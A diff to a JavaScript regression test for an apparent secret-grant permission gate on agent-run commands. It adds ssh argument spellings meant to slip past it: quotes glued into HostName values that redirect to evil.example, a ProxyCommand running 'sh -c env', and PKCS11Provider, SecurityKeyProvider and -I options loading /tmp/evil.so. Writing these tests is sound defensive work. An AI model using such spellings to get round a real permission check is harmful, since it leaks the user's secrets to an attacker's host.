@@ -962,7 +962,7 @@ console.log('㉜ ROUND 9 (BLOCKER item 1) — the host-scoped 8-hour PASTE grant
   ok(leak.length === 0, 'every command whose destination cannot be READ draws its card — never by:grant with the secret in its env (the r7 regression: all five ran by:grant for 8 h)', { leak });
 }
 
-console.log('㉝ ROUND 9/10 (BLOCKER item 2) — the door reads an ssh `-o` keyword as OpenSSH strdelim does: a leading `=`, a `"keyword"` pair, a mid-keyword quote, an EMPTY QUOTED first token (`"" ProxyCommand=…`) and a QUOTE GLUED to the keyword or value (`"HostName"evil`, `Host"Name"evil`) no longer hide ProxyCommand / HostName / ProxyJump / ControlPath (a grant for box.example only)');
+console.log('㉝ ROUND 9/10/11 (BLOCKER item 2 + its r10 regression + MAJOR) — the door reads an ssh `-o` KEYWORD as OpenSSH strdelim and the VALUE as argv_split: a leading `=`, a `"keyword"` pair, a mid-keyword quote, an EMPTY QUOTED first token, a QUOTE GLUED to the keyword, AND (round 11) a quote glued INSIDE the value (`HostName "box".evil`), an empty-quote prefix, a `%` behind a quote, plus CanonicalDomains / PKCS11Provider / SecurityKeyProvider / `-I` no longer hide the real host or the loaded code (a grant for box.example only)');
 {
   const w = await world();
   const e = entryOf(w, { label: 'box key' });
@@ -985,10 +985,23 @@ console.log('㉝ ROUND 9/10 (BLOCKER item 2) — the door reads an ssh `-o` keyw
     ['"HostName"glued', ['ssh', '-o', '"HostName"evil.example', 'box.example', 'true']],
     ['Host"Name"glued', ['ssh', '-o', 'Host"Name"evil.example', 'box.example', 'true']],
     ['"ProxyCommand"glued', ['ssh', '-o', '"ProxyCommand"sh -c env', 'box.example', 'true']],
+    // round 11 (BLOCKER regression): a quote glued INSIDE the -o VALUE — ssh reads the value with argv_split (a quote glues,
+    // never ends the token), so these dial box.example.evil.example / evil.example; r10 read the value with strdelim and stopped
+    // at the quote ⇒ named box.example (the grant) ⇒ by:grant, the secret riding toward the attacker's host with no card.
+    ['HostName "box".evil glued-value', ['ssh', '-o', 'HostName "box.example".evil.example', 'box.example', 'true']],
+    ['HostName box"".evil glued-value', ['ssh', '-o', 'HostName box.example"".evil.example', 'box.example', 'true']],
+    ['HostName ""evil empty-quote-prefix', ['ssh', '-o', 'HostName ""evil.example', 'box.example', 'true']],
+    ['HostName "box"%h behind-quote %', ['ssh', '-o', 'HostName "box.example"%h.evil', 'box.example', 'true']],
+    ['HostName=box=evil literal-=', ['ssh', '-o', 'HostName=box.example=evil.example', 'box.example', 'true']],
+    // round 11 (MAJOR): a keyword that rewrites the host / loads agent-written code with the secret in env — «no option» on r10
+    ['-I pkcs11 provider', ['ssh', '-I', '/tmp/evil.so', 'box.example', 'true']],
+    ['-o PKCS11Provider=', ['ssh', '-o', 'PKCS11Provider=/tmp/evil.so', 'box.example', 'true']],
+    ['-o SecurityKeyProvider=', ['ssh', '-o', 'SecurityKeyProvider=/tmp/evil.so', 'box.example', 'true']],
+    ['-o CanonicalDomains=', ['ssh', '-o', 'CanonicalDomains=evil.example', 'box.example', 'true']],
   ];
   const leak = [];
   for (const [n, argv] of attacks) { const r = await run(argv); if (r.r.ok || r.r.by === 'grant' || !r.card) leak.push(`${n}:by=${r.r.by || r.r.code},card=${!!r.card}`); }
-  ok(leak.length === 0, 'every quoted / leading-= / empty-quote / glued-quote `-o` spelling of a host or local-command option draws its card — never by:grant to a host the grant does not name', { leak });
+  ok(leak.length === 0, 'every quoted / leading-= / empty-quote / glued-quote keyword OR glued-quote VALUE (round 11: argv_split) `-o` spelling of a host / local-command / host-rewriting / code-loading option — and `-I` — draws its card, never by:grant to a host the grant does not name', { leak });
 }
 
 console.log('㉞ ROUND 9 (MAJOR item 3) — «Always» is ALL-OR-NOTHING: a refused second entry narrows a WIDENED existing member back (not only an added one revoked) and the switch restore is PUSHED to the window');
